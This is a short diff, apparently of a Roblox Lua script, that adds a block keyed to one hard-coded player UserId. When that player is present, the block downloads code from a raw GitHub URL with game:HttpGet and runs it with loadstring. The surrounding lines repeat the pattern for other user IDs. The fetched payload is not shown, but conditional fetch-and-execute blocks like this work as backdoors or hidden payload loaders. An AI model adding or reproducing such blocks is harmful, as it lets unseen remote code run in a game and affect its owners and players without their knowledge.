@@ -6,6 +6,14 @@ if JohnV2 then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Juanko-Scripts/MoonSecV3Test/refs/heads/main/johnybustos15%20User"))()
 end
 
+-- JuankoModsXP
+
+local JohnV1 = "7738488195"
+local JohnV2 = game.Players:GetPlayerByUserId(JohnV1)
+if JohnV2 then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Juanko-Scripts/MoonSecV3Test/refs/heads/main/JuankoModsXP%20User"))()
+end
+
 -- emingabermeo15274  
 
 local EmingabernoV1 = "1534354462"
